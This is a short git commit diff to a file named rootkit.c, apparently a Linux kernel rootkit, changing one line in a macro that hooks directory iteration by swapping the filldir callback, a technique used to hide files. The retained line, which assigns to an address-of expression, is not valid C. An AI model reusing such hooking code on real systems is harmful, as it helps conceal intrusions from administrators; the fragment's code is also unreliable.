958eaf5e97d475a192a479c845ad6b13abec877b
Juan Schällibaum <juanschallibaum@hotmail.com>
2018-07-24 02:59:53 -0300

    Update rootkit.c

--- rootkit.c
+++ rootkit.c
@@ -909,7 +909,6 @@ static int n_udp6_seq_show ( struct seq_file *seq, void *v )
 	    int ret; \
 	    int (*original_iterate)(struct file *, struct dir_context *); \
             original_##NAME##_filldir = context->actor; \
-            //*((filldir_t*)&context->actor) = NAME##_filldir; \
 	    &context->actor = NAME##_filldir; \
             \
             original_iterate = asm_hook_unpatch(NAME##_iterate); \
